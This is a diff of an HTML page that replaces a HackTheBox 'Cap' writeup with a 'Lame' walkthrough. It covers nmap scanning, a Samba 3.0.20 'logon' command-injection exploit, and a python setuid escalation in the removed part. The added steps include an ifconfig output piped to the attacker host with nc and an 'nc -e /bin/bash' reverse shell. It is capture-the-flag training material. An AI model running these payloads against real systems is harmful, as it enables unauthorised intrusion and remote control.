@@ -58,101 +58,169 @@
 </head>
 <body>
 
-    <h1>HTB - Cap Writeup</h1>
-    <p><a href="#">Link to room on HackTheBox</a></p>
+    <h1>HTB - Lame Writeup</h1>
+    <p><a href="https://app.hackthebox.com/machines/Lame">Link to room on HackTheBox</a></p>
 
-    <h3>Edit /etc/hosts</h3>
+    <div class="img-container">
+        <img src="Lame.png" alt="nmap output">
+    </div>
+
+    
+
+    <h3>Scanning with nmap</h3>
     <div class="code-block">
         <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code>nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 10.10.10.245 -oG allports</code>
+        <code>nmap -p- --open -sS --min-rate=5000 -n -Pn -vvv 10.10.10.3 -oG allports</code>
     </div>
     <div class="img-container">
-        <img src="capturashack/1.png" alt="nmap output">
-    </div>
-
-
-    <h3>Scan with Nmap</h3>
-    <div class="code-block">
-        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code> nmap -p21,22,80 -sCV 10.10.10.245 -oN scan </code>
-    </div>
-    <div class="img-container">
-        <img src="capturashack/2.png" alt="nmap output">
-    </div>
-
-    <h3>We enter the ip on the web through port 80</h3>
-       <div class="img-container">
-        <img src="capturashack/3.png" alt="nmap output">
-    </div>
-
-    <h3>We enter the section of analysis or captures, put in url /data/0 and we can download the capture</h3>
-   
-    <div class="img-container">
-        <img src="capturashack/4.png" alt="nmap output">
+        <img src="capturashack/scan1.png" alt="nmap output">
     </div>
 
 
     
-    <h3>We can see with tshark the capture of the .pcap file</h3>
-      
     <div class="code-block">
         <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code> tshark -r 0.pcap -Y ftp  </code>
+        <code> nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -oN scan.txt </code>
+    </div>
+    <div class="img-container">
+        <img src="capturashack/scan2.png" alt="nmap output">
     </div>
 
-    <div class="img-container">
-        <img src="capturashack/5.png" alt="nmap output">
-    </div>
     
-    <h3> We found a user credentials in the capture and we can connect with ssh in port 22 with this credentials</h3>
-      
+
+    <h3>trying ftp anonymous login, but we dont have permission for up files or execute commands, and no files found in this directory</h3>
     <div class="code-block">
         <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code> ssh nathan@10.10.10.245</code>
+        <code> ftp 10.10.10.3 </code>
     </div>
-
-    <div class="img-container">
-        <img src="capturashack/connected.png" alt="nmap output">
-    </div>
-
-    <h3> we use ls for list current dir and found the flag in the user.txt </h3>
-      
-       <div class="img-container">
-        <img src="capturashack/userflag.png" alt="nmap output">
-    </div>
-
-    <h3>We will try scalate privileges with capabilities or setuid,setgid perms</h3>
-      
-    <div class="code-block">
-        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code>getcap -r / 2> /dev/null</code>
-    </div>
-
-
-    <div class="img-container">
-        <img src="capturashack/getcap.png" alt="nmap output">
-    </div>
-
-    <h3>We execute a python command and scalate with os library</h3>
-      
-    <div class="code-block">
-        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
-        <code> python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")' </code>
-    </div>
-
-
-    <div class="img-container">
-        <img src="capturashack/scalate.png" alt="nmap output">
-    </div>
-
-    <h3> We get the root flag  </h3>
-      
    
     <div class="img-container">
-        <img src="capturashack/adminflag.png" alt="nmap output">
+        <img src="capturashack/ftpanon.png" alt="nmap output">
     </div>
 
-   <script>
+
+    
+    <h3> We can search exploits for ftp, smb or ssh versions </h3>
+        <h3> With -m param we can copy the script in local dir </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>searchsploit vsftpd 2.3.4</code>
+ 
+        <code>searchsploit -m vsftpd 2.3.4</code>
+    </div>
+
+    <div class="img-container">
+        <img src="capturashack/sploitftp.png" alt="nmap output">
+    </div>
+    
+    <h3>We found a ftp exploit , we can inspect this python for manual exploit , we will try... but dont working</h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code> nc 10.10.10.3 21 </code>
+    </div>
+
+    <div class="img-container">
+        <img src="capturashack/tryftpsploit.png" alt="nmap output">
+    </div>
+
+
+
+    <h3>We found this smb exploit</h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>searchsploit Samba 3.0.20</code>
+    </div>
+
+
+    <div class="img-container">
+        <img src="capturashack/smbsploit.png" alt="nmap output">
+    </div>
+
+    <h3>We can enum with smbclient</h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1' </code>
+    </div>
+
+
+    <div class="img-container">
+        <img src="capturashack/smbenum.png" alt="nmap output">
+    </div>
+
+    <h3> Connect to tmp dir </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1' </code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/connectsmb.png" alt="nmap output">
+    </div>
+    <h3> we execute a command on the remote computer using the samba logon command, as they do in the exploit we have found </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>logon "/=`nohup ping -c 1 10.10.14.10`"</code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/executecommand.png" alt="nmap output">
+    </div>
+    <h3>  try send a ifconfig </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>logon "/=`nohup ifconfig | nc 10.10.14.10 443`"</code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/testcommand.png" alt="nmap output">
+    </div>
+    <h3>We can send a shell to my parrot machine </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>logon "/=`nohup nc -e /bin/bash 10.10.14.10 443`"</code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/ifconfig.png" alt="nmap output">
+    </div>
+ 
+    <h3> Create a pseudoconsole and interactive console </h3>
+      
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code>script /dev/null -c bash</code>
+    </div>
+    <h3> Pulse control + Z for suspend terminal , put stty command and reset xterm , next put stty size</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code> stty raw -echo; fg </code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/seudoshell.png" alt="nmap output">
+    </div>
+   
+    <h3> Finally find flags</h3>
+    <div class="code-block">
+        <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+        <code> find / -name user.txt </code>
+    </div>
+   
+    <div class="img-container">
+        <img src="capturashack/flags.png" alt="nmap output">
+    </div>
+   
+
+
+    <script>
         function copyToClipboard(btn) {
             const code = btn.nextElementSibling.innerText;
             navigator.clipboard.writeText(code).then(() => {
